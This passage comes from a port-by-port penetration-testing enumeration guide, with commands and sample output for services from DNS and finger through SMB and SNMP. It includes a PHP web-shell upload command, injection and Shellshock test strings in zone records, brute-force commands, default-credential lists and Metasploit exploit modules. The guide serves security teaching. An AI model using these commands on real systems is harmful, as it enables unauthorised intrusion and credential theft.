    | zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.
    | zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.
    | zonetransfer.me.                                A      217.147.xx.xx
    | zonetransfer.me.                                NS     nsztm1.digi.ninja.
    | zonetransfer.me.                                NS     nsztm2.digi.ninja.
    | _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.
    | 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.
    | asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.
    | asfdbbox.zonetransfer.me.                       A      127.0.xx.xx
    | asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.
    | canberra-office.zonetransfer.me.                A      202.14.xx.xx
    | cmdexec.zonetransfer.me.                        TXT    "; ls"
    | contact.zonetransfer.me.                        TXT    "Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
    | dc-office.zonetransfer.me.                      A      143.228.xx.xx
    | deadbeef.zonetransfer.me.                       AAAA   dead:beaf::
    | dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m
    | DZC.zonetransfer.me.                            TXT    "AbCdEfG"
    | email.zonetransfer.me.                          NAPTR  1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
    | email.zonetransfer.me.                          A      74.125.xx.xx
    | Info.zonetransfer.me.                           TXT    "ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
    | internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.
    | internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.
    | intns1.zonetransfer.me.                         A      167.88.xx.xx
    | intns2.zonetransfer.me.                         A      167.88.xx.xx
    | office.zonetransfer.me.                         A      4.23.xx.xx
    | ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332
    | owa.zonetransfer.me.                            A      207.46.xx.xx
    | robinwood.zonetransfer.me.                      TXT    "Robin Wood"
    | rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.
    | sip.zonetransfer.me.                            NAPTR  2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
    | sqli.zonetransfer.me.                           TXT    "' or 1=1 --"
    | sshock.zonetransfer.me.                         TXT    "() { :]}; echo ShellShocked"
    | staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.
    | alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx
    | testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.
    | vpn.zonetransfer.me.                            A      174.36.xx.xx
    | www.zonetransfer.me.                            A      217.147.xx.xx
    | xss.zonetransfer.me.                            TXT    "'><script>alert('Boo')</script>"
    |_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
    135/tcp  filtered msrpc
    445/tcp  filtered microsoft-ds
    8333/tcp filtered bitcoin

    Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```

# Port 69 - TFTP

This is a ftp-server but it is using UDP.

# Port 79 - Finger

## Metasploit

### Finger Service User Enumerator

Used to identify users.

    use auxiliary/scanner/finger/finger_users
    services -p 79 -u -R

Sample Output:

    [+] 172.30.xx.xx:79 - Found user: adm
    [+] 172.30.xx.xx:79 - Found user: lp
    [+] 172.30.xx.xx:79 - Found user: uucp
    [+] 172.30.xx.xx:79 - Found user: nuucp
    [+] 172.30.xx.xx:79 - Found user: listen
    [+] 172.30.xx.xx:79 - Found user: bin
    [+] 172.30.xx.xx:79 - Found user: daemon
    [+] 172.30.xx.xx:79 - Found user: gdm
    [+] 172.30.xx.xx:79 - Found user: noaccess
    [+] 172.30.xx.xx:79 - Found user: nobody
    [+] 172.30.xx.xx:79 - Found user: nobody4
    [+] 172.30.xx.xx:79 - Found user: oracle
    [+] 172.30.xx.xx:79 - Found user: postgres
    [+] 172.30.xx.xx:79 - Found user: root
    [+] 172.30.xx.xx:79 - Found user: svctag
    [+] 172.30.xx.xx:79 - Found user: sys
    [+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp

## Nmap

### Finger

<a href="https://nmap.org/nsedoc/scripts/finger.html" class="reference external">finger.nse</a> : Attempts to retrieve a list of usernames using the finger service.

Sample Output:

    Yet to run

## Other

### Patator finger user enumeration

```text
patator finger_lookup host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt --rate-limit=1 -x ignore:fgrep='no such user'
```

### finger command

Same can be done using finger command

    finger root 172.30.xx.xx
    finger: 172.30.xx.xx: no such user.
    Login: root                            Name: root
    Directory: /root                       Shell: /bin/bash
    Last login Sat Feb  6 22:43 (IST) on tty1
    No mail.
    No Plan.

Need to know weather in your city? Just do finger <a href="mailto:cityname%40graph.no" class="reference external">cityname<span>@</span>graph<span>.</span>no</a>

    finger newdelhi@graph.no
                      -= Meteogram for india/delhi/new_delhi =-
    'C                                                                   Rain
    37
    36                                 ^^^^^^^^^^^^^^^
    35                              ^^^               ^^^
    34                           =--                     ^^^
    33                        ^^^
    32                                                      ^^^
    31                  ^^^^^^                                 ^^^^^^
    30                                                               ^^^
    29^^^^^^=--^^^^^^^^^
    28
       01 02 03 04 05_06_07_08_09_10_11_12_13_14_15_16_17_18 19 20 21 22 Hour

       SW SW SW SW  W  W  W  W NW NW NW NW NW NW NW NW  W  W  W SW SW SW Wind dir.
        2  2  2  2  3  5  5  6  7  6  6  6  6  6  6  5  4  2  2  1  2  2 Wind(mps)

    Legend left axis:   - Sunny   ^ Scattered   = Clouded   =V= Thunder   # Fog
    Legend right axis:  | Rain    ! Sleet       * Snow
    [Weather forecast from yr.no, delivered by the Norwegian Meteorological Institute and the NRK.]



# Port 80 - HTTP

Info about web-vulnerabilities can be found in the next chapter [HTTP - Web Vulnerabilities](../http-web-vulnerabilities/). When enumerating HTTP, here are some of the things we should be taking note of:

* Scripting language in use \(PHP, JSP, ASP etc.\)
* Apache modules
* Hidden directories
* Robots.txt
* Database in use
* Web applications installed \(Wordpress etc.\)
* Web application behavior, i.e. where does it store or write data
* 403 errors - check user-agent
* Source code

## HTTP Enumeration

**Check server header**

First, let's start off by grabbing the web server headers

`curl -Ik http://10.10.10.140`

And source code

`curl -ik http://10.10.10.140`

Check if server supports `PUT` and whether we can upload:

`curl -v -X OPTIONS http://10.10.10.140`

`curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php`

**Checking for common misconfigurations and vulnerabilities**

`nikto -h http://10.10.10.10`

Remember to also run `nikto` against any interesting directories found. If using a proxy server then:

`nikto -h http://10.10.10.10 -useproxy http://proxy:8080`

We can also launch a few nmap NSE scripts as well to round out this phase:

`nmap -vv -sV -PN -p 80 10.10.10.10 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN 10.10.10.10_http.nse`

**Directory brute forcing**

After we have run the above enumeration techniques we should now attempt to discover any hidden directories on the server

`dirb http://10.10.10.140 -r -o 10.10.10.140_http.dirb`

`gobuster -u http://10.10.10.140 -w /usr/share/seclists/Discovery/Web_Content_common.txt -s '200,204,301,302,307,403,500' -e > 10.10.10.140.gobuster`

Failing this, it is definitely worth creating a custom wordlist with all available target data and running this through `drib` to catch anything else.

**Creating a custom wordlist**

`cewl -d 5 -m 2 http://10.10.10.140`

Remember to append any text you find inside images as to the custom wordlist as well!

**Default credentials check**

It always pays to check any login forms or web applications for default or weak credentials. A quick way to find default credentials via Google:

`site:webapplication.com password`

A small sample to check on the fly:

```text
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username> password
<username> admin
<username> username
<username> nameofservice
```

More lists available in `/usr/share/wordlists/.`

**Brute force password protected directories \(.htaccess\)**

Using `medusa`

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

**What next?**

* Search for publicly known vulnerabilities and exploits
* See chapter [Attacking the System](../http-web-vulnerabilities/attacking-the-system/) for web application attacks \(SQLi, LFI, RFI, XSS, etc\)
* Kick off a ZAP scan to detect  possible injection points

# Port 88 - Kerberos

Kerberos is a protocol that is used for network authentication. Different versions are used by \*nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.

If you already have a login to a user of that domain you might be able to escalate that privilege.

Check out:

* MS14-068

## Nmap

### krb5-enum-users

<a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html" class="reference external">krb5-enum-users.nse</a> : Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC\_ERR\_PREAUTH\_REQUIRED, signaling that the user is required to perform pre authentication.

The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.

    nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='XX-XXXT'" 10.74.251.24

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-23 12:13 IST
    Nmap scan report for ecindxxxxx.internal.vxxxxx.com (10.74.251.24)
    Host is up (0.0015s latency).
    PORT   STATE SERVICE
    88/tcp open  kerberos-sec
    | krb5-enum-users:
    | Discovered Kerberos principals
    |_    root@XX-XXXT

    Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds


# Port 110 - POP3

This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network \(or outside\) access this server to fetch their emails.

## Metasploit

Two auxiliary scanner modules

### POP3 Banner Grabber

Banner grabber for pop3

    use auxiliary/scanner/pop3/pop3_version
    services -p 110 -R -u

### POP3 Login Utility

Attempts to authenticate to an POP3 service.

    use auxiliary/scanner/pop3/pop3_login
    services -p 110 -R -u

## Nmap

Two NSEs

### POP3-capabilities

<a href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html" class="reference external">pop3-capabilities.nse</a> : Retrieves POP3 email server capabilities.

### POP3-brute

<a href="https://nmap.org/nsedoc/scripts/pop3-brute.html" class="reference external">pop3-brute.nse</a> : Tries to log into a POP3 account by guessing usernames and passwords.

    nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx

Tip

While playing one of Vulnhub machines, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.

## Other

### POP3 Commands

Once, we are connected to the POP3 Server, we can execute the below commands. Think we got some user credentials, we can read the emails of that user using POP3

    USER   Your user name for this mail server
    PASS   Your password.
    QUIT   End your session.
    STAT   Number and total size of all messages
    LIST   Message# and size of message
    RETR message#  Retrieve selected message
    DELE message#  Delete selected message
    NOOP   No-op. Keeps you connection open.
    RSET   Reset the mailbox. Undelete deleted messages.

### Interacting with the POP3 server
```text
telnet 192.168.1.105 110
USER pelle@192.168.1.105
PASS admin

List all emails
list

Retrive email number 5, for example
retr 5
```

# Port 111 - RPCBIND

RFC: 1833

Rpcbind can help us look for NFS-shares. So look out for nfs.

## Metasploit

### NFS Mount Scanner

Check for the nfs mounts using port 111

    use auxiliary/scanner/nfs/nfsmount
    services -p 111 -u -R

Sample Output:
```
    [*] Scanned  24 of 240 hosts (10% complete)
    [+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]
    [*] Scanned  48 of 240 hosts (20% complete)
    [+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]
    [+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]
    [+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]
    [*] Scanned  72 of 240 hosts (30% complete)
    [+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]
    [*] Scanned  96 of 240 hosts (40% complete)
    [+] 10.10.xx.xx NFS Export: /common []
```
## Other

### rpcinfo

rpcinfo makes an RPC call to an RPC server and reports what it finds

    rpcinfo -p IP_Address

Sample Output:

    rpcinfo -p 10.7.xx.xx
     program vers proto   port  service
      100000    2   tcp    111  portmapper
      100000    2   udp    111  portmapper
      741824    1   tcp    669
      741824    2   tcp    669
      399929    2   tcp    631

The same can be achieved using `showmount`

    showmount -a 172.30.xx.xx
    All mount points on 172.30.xx.xx:
    172.30.xx.xx:/SSSC-LOGS
    172.30.xx.xx:/sssclogs

Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with `showmount`

    for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a);
    do
           showmount -a $i >> nfs_111;
    done;

### rpcbind


    rpcbind -p 192.168.1.101

    # Ident - Port 113

    ## Nmap

    ### Auth-owners

    <a href="https://nmap.org/nsedoc/scripts/auth-owners.html" class="reference external">auth-owners.nse</a> : Attempts to find the owner of an open TCP port by querying an auth daemon which must also be open on the target system.

    ## Other

    ### Ident-user-enum

    If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by

    Sample Output

        perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515
        ident-user-enum v1.0 (http://pentestmonkey.net/tools/ident-user-enum)

        10.10.xx.xx:22         [U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]
        10.10.xx.xx:53         [U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]
        10.10.xx.xx:111        [U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]
        10.10.xx.xx:113        [U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]
        10.10.xx.xx:512        [U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]
        10.10.xx.xx:513        [U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]
        10.10.xx.xx:514        [U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]
        10.10.xx.xx:515        [U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]

    The above are base64 encoded, when decoded results in Salted\_Some\_Garbage. If anyone know what it’s appreciated.


# Port 119 - NNTP

Network News Transfer Protocol (NNTP), is used for the distribution, inquiry, retrieval, and posting of Netnews articles using a reliable stream-based mechanism. For news-reading clients, NNTP enables retrieval of news articles that are stored in a central database, giving subscribers the ability to select only those articles they wish to read.

## Commands

### CAPABILITIES

CAPABILITIES \[keyword\] allows a client to determine the capabilities of the server at any given time.

### MODE READER

MODE READER :

    Responses
    200    Posting allowed
    201    Posting prohibited
    502    Reading service permanently unavailable

### QUIT

QUIT : to disconnect the session

### LISTGROUP

LISTGROUP \[group \[range\]\] : The LISTGROUP command selects a newsgroup in the same manner as the GROUP command (see Section 6.1.1) but also provides a list of article numbers in the newsgroup. If no group is specified, the currently selected newsgroup is used.

### ARTICLE

ARTICLE message-id The ARTICLE command selects an article according to the arguments and presents the entire article (that is, the headers, an empty line, and the body, in that order) to the client

### POST

POST

    [C] POST
    [S] 340 Input article; end with <CR-LF>.<CR-LF>
    [C] From: "Demo User" <nobody@example.net>
    [C] Newsgroups: misc.test
    [C] Subject: I am just a test article
    [C] Organization: An Example Net
    [C]
    [C] This is just a test article.
    [C] .
    [S] 240 Article received OK


# Port 135 - MSRPC

Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.

## Nmap

```text
nmap -vv --script=msrpc-enum 10.10.10.130
```

```text
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Metasploit

### Endpoint Mapper Service Discovery

Module can be used to obtain information from the Endpoint Mapper service

    use auxiliary/scanner/dcerpc/endpoint_mapper

### Hidden DCERPC Service Discovery

Module will query the endpoint mapper and make a list of all ncacn\_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.

    use auxiliary/scanner/dcerpc/hidden

### Remote Management Interface Discovery

Module can be used to obtain information from the Remote Management Interface DCERPC service.

    use auxiliary/scanner/dcerpc/management

### DCERPC TCP Service Auditor

Determine what DCERPC services are accessible over a TCP port.

    use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

## Other

We can use **rpcdump** from **Impacket** to dump the RPC information. This tool can communicate over Port 135, 139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.

### rpcdump

    Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

    usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]
                      target [{445/SMB,135/TCP,139/SMB}]

    Dumps the remote RPC endpoints information

Sample Output:

```
    rpcdump.py 10.10.xx.xx
    Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

    [*] Retrieving endpoint list from 10.10.xx.xx
    [*] Trying protocol 135/TCP...
    Protocol: N/A
    Provider: iphlpsvc.dll
    UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
    Bindings:
              ncacn_np:\\ADS[\PIPE\srvsvc]
              ncacn_ip_tcp:10.10.xx.xx[49154]
              ncacn_np:\\ADS[\PIPE\atsvc]
              ncalrpc:[senssvc]
              ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
              ncalrpc:[IUserProfile2]

    Protocol: N/A
    Provider: schedsvc.dll
    UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0
    Bindings:
              ncalrpc:[senssvc]
              ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
              ncalrpc:[IUserProfile2]

    Protocol: N/A
    Provider: nsisvc.dll
    UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
    Bindings:
              ncalrpc:[LRPC-37912a0de47813b4b3]
              ncalrpc:[OLE6ECE1F6A513142EC99562256F849]

    Protocol: [MS-CMPO]: MSDTC Connection Manager:
    Provider: msdtcprx.dll
    UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0
    Bindings:
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]

    Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol
    Provider: spoolsv.exe
    UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
    Bindings:
              ncalrpc:[spoolss]

    Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol
    Provider: taskcomp.dll

    Protocol: N/A
    Provider: MPSSVC.dll
    UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
    Bindings:
              ncalrpc:[LRPC-5409763072e46c4586]

    [*] Received 189 endpoints.
```
# Port 139/445 - SMB/Samba

Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server. Here are some things to look for when enumerating SMB:

- Enumeration of users!
  - Leading to brute force attacks
  - Further attacks against other vectors such as login forms etc
- SMB version
  - Many versions are vulnerable and exploits available
- Anonymous access
- Misconfigured shares
  - Modify or upload files

## Connecting

For linux-users you can log in to the smb-share using smbclient, like this:

```text
smbclient -L 192.168.1.102
smbclient //192.168.1.106/tmp
smbclient \\\\192.168.1.105\\ipc$ -U john
smbclient //192.168.1.105/ipc$ -U john
```

If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.

## Mounting an SMB shares

```text
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

## Connecting with PSExec

If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.

```text
use exploit/windows/smb/psexec
```

## Nmap NSE scan

```text
nmap -vv --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.10.10.10 -p 445 -oA 10.10.10.10_smb.nse
```

## List of Nmap NSE scripts for SMB

There are several NSE scripts that can be useful, for example:

```text
ls -l /usr/share/nmap/scripts/smb*
```

```text
-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse
-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse
-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse
-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse
-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse
-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse
-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse
-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse
-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse
-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse
-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse
-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse
-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse
-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse
-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
```

## nbtscan

```text
nbtscan -r 192.168.1.1/24
```

It can be a bit buggy sometimes so run it several times to make sure it found all users.

## enum4linux

Enum4linux can be used to enumerate windows and linux machines with smb-shares.

The do all option:

```text
enum4linux -a 192.168.1.120
```

## rpcclient

You can also use rpcclient to enumerate the share.

Connect with a null-session. That is, without a user. This only works for older windows servers.

```text
rpcclient -U "" 192.168.1.101
```

Once connected you could enter commands like

```text
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
```

## Scanning the network for shares

Scanning for smb with nmap

```text
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
```

# Port 143/993 - IMAP

IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client \(like outlook\) fetches the emails from the mail-server using imap.

IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.

Port 993 is the secure port for IMAP.

# Port 161 and 162 - SNMP

Simple Network Management Protocol

SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.

SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.

You can have read-only access to the snmp often just with the community string `public`.

Common community strings

- public
- private
- community

Here is a longer list of common community strings: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt)

## MIB - Management information base

SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The "leaf" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.

### snmpwalm

```text
snmpwalk -c public -v1 192.168.1.101 #community string and which version
```

This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:

```text
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

Now we can use this to query the data we really want.

**snmpenum**

### snmp-check

This is a bit easier to use and with a lot prettier output.

```text
snmp-check -t 192.168.1.101 -c public
```

## Scan for open ports - Nmap

Since SNMP is using UDP we have to use the `-sU` flag.

```text
nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
```

## Onesixtyone

With onesixtyone you can test for open ports but also brute force community strings.  
I have had more success using onesixtyone than using nmap. So better use both.

```text

```

## Metasploit

### SNMP Community Scanner

Find the machines which are having default communtites by using SNMP Community Scanner.

    use auxiliary/scanner/snmp/snmp_login
    services -p 161 -u -R

Sample Output:
```
    [+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)
    Technical Support: http://www.cisco.com/techsupport
    Copyright (c) 1986-2007 by Cisco Systems, Inc.
    Compiled Wed 24-Oct-07 15:17 by prod_rel_team
    [*] Scanned 12 of 58 hosts (20% complete)
    [*] Scanned 18 of 58 hosts (31% complete)
    [+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
    [+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
    [*] Scanned 24 of 58 hosts (41% complete)
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [*] Scanned 29 of 58 hosts (50% complete)
    [*] Scanned 35 of 58 hosts (60% complete)
    [*] Scanned 41 of 58 hosts (70% complete)
    [*] Scanned 47 of 58 hosts (81% complete)
    [+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
```
### SNMP Enumeration Module

Enumerate the devices for which we have found the community strings
```
    use auxiliary/scanner/snmp/snmp_enum
    creds -p 161 -R
```
Sample Output:
```
    [+] 10.11.xx.xx, Connected.
    [*] System information:

    Host IP                       : 10.11.xx.xx
    Hostname                      : X150-24t
    Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    Contact                       : support@extremenetworks.com, +1 888 257 3000
    Location                      : -
    Uptime snmp                   : -
    Uptime system                 : 206 days, 00:20:58.04
    System date                   : -

    [*] Network information:

